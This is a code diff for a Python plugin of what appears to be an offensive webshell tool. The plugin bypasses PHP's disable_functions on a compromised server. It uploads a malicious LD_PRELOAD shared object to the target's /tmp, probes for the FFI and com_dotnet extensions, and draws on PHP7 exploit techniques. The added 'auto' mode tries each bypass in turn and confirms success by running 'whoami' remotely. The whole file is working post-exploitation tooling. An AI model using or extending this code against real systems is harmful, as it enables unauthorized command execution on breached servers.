@@ -1,17 +1,22 @@
 from libs.config import alias, color, gget, gset
 from os import path, getcwd
 from uuid import uuid4
-from libs.myapp import is_windows, send
+from libs.myapp import is_windows, send, get_system_code
 from webshell_plugins.upload import run as upload
 
-mode_to_desc_dict = {0: color.red("closed"),
+mode_to_desc_dict = {-1: color.red("closed"),
                      1: color.green("php7-backtrace"),
                      2: color.green("php7-gc"),
                      3: color.green("php7-json"),
                      4: color.green("LD_PRELOAD"),
                      5: color.green("FFI"),
                      6: color.green("COM")}
-mode_linux_dict = (1, 2, 4, 5)
+mode_linux_set = {1, 2, 4, 5}
+mode_windows_set = {6, }
+
+total_test_list = set(mode_to_desc_dict.keys()) - {-1}
+windows_test_list = total_test_list - mode_linux_set
+linux_test_list = total_test_list - mode_windows_set
 
 
 def get_detectd_ld_preload():
@@ -29,8 +34,47 @@ def get_detectd_ext(extname: str):
     return """if (extension_loaded("%s")){echo "exist";}""" % extname
 
 
+def set_mode(mode: int, test: bool = False):
+    if (mode == 4 and not gget("webshell.ld_preload_path", "webshell", False)):
+        disable_func_list = gget("webshell.disable_functions", "webshell")
+        filename = "/tmp/%s.so" % str(uuid4())
+        upload_result = upload(
+            path.join(getcwd(), "auxiliary", "ld_preload_x86_64.so"), filename, True)
+        if (not upload_result):
+            return
+        if ("putenv" in disable_func_list):
+            print(color.red("\nputenv is disabled.\n"))
+            return False
+        ld_preload_func = send(get_detectd_ld_preload()).r_text.strip()
+        if (not ld_preload_func):
+            print(color.red("\nNo ld_preload function!\n"))
+            return False
+        gset("webshell.ld_preload_path", filename, True, "webshell")
+        gset("webshell.ld_preload_func", ld_preload_func, True, "webshell")
+    if (mode == 5):
+        res = send(get_detectd_ext("FFI"))
+        if (not res):
+            return False
+        text = res.r_text.strip()
+        if ("exist" not in text):
+            print(color.red("\nNo FFI extension!\n"))
+            return False
+    if (mode == 6):
+        res = send(get_detectd_ext("com_dotnet"))
+        if (not res):
+            return False
+        text = res.r_text.strip()
+        if ("exist" not in text):
+            print(color.red("\nNo com_dotnet extension!\n"))
+            return False
+    if (not test):
+        print(f"\nSet bypass disable_functions: {mode} {mode_to_desc_dict[mode]}\n")
+        gset("webshell.bypass_df", mode, True, "webshell")
+    return True
+
+
 @alias(True, m="mode")
-def run(mode: int = 0):
+def run(mode: str = '0'):
     """
     bdf
 
@@ -80,6 +124,9 @@ def run(mode: int = 0):
 
     Mode 5 FFI(Only for *unix and php >= 7.4):
 
+        Author:
+        - MorouU
+
         Need:
         - FFI extension
 
@@ -89,42 +136,34 @@ def run(mode: int = 0):
         - com_dotnet extension
 
     """
-    if (mode in mode_to_desc_dict and (mode not in mode_linux_dict or not is_windows())):
-        if (mode == 4 and not gget("webshell.ld_preload_path", "webshell", False)):
-            disable_func_list = gget("webshell.disable_functions", "webshell")
-            filename = "/tmp/%s.so" % str(uuid4())
-            upload_result = upload(
-                path.join(getcwd(), "auxiliary", "ld_preload_x86_64.so"), filename, True)
-            if (not upload_result):
-                return
-            if ("putenv" in disable_func_list):
-                print(color.red("\nputenv is disabled.\n"))
-                return
-            ld_preload_func = send(get_detectd_ld_preload()).r_text.strip()
-            if (not ld_preload_func):
-                print(color.red("\nNo ld_preload function!\n"))
-                return
-            gset("webshell.ld_preload_path", filename, True, "webshell")
-            gset("webshell.ld_preload_func", ld_preload_func, True, "webshell")
-        if (mode == 5):
-            res = send(get_detectd_ext("FFI"))
-            if (not res):
-                return
-            text = res.r_text.strip()
-            if ("exist" not in text):
-                print(color.red("\nNo FFI extension!\n"))
-                return
-        if (mode == 6):
-            res = send(get_detectd_ext("com_dotnet"))
-            if (not res):
-                return
-            text = res.r_text.strip()
-            if ("exist" not in text):
-                print(color.red("\nNo com_dotnet extension!\n"))
-                return
-        print(
-            f"\nbypass disable_functions: {mode_to_desc_dict[mode]}\n")
-        gset("webshell.bypass_df", mode, True, "webshell")
+    if (mode == "auto"):
+        test_list = windows_test_list if is_windows() else linux_test_list
+        php_version = gget("webshell.php_version", "webshell")
+        if (not php_version.startswith("7.")):
+            test_list -= {1, 2, 3}
+        for test_mode in test_list:
+            print(f"Try Mode {test_mode} {mode_to_desc_dict[test_mode]}:")
+            if (set_mode(test_mode, True)):
+                res = send(get_system_code("whoami", mode=test_mode))
+                if (res and len(res.r_text)):
+                    print(color.green("\nSuccess\n"))
+                    print(f"Set bypass disable_functions: {test_mode} {mode_to_desc_dict[test_mode]}\n")
+                    gset("webshell.bypass_df", test_mode, True, "webshell")
+                    break
+                else:
+                    print(color.red("\nFailed!\n"))
+                    continue
     else:
-        print(color.red("\nMode error.\n"))
-        return
+        try:
+            mode = int(mode)
+        except ValueError:
+            print(color.red("\nMode error.\n"))
+            return
+        if (mode == 0):
+            print(
+                f"\nbypass disable_functions: {mode_to_desc_dict[gget('webshell.bypass_df', 'webshell')]}\n")
+        elif (mode in mode_to_desc_dict and (mode not in mode_linux_set or not is_windows())):
+            set_mode(mode)
+            pass
+        else:
+            print(color.red("\nMode error.\n"))
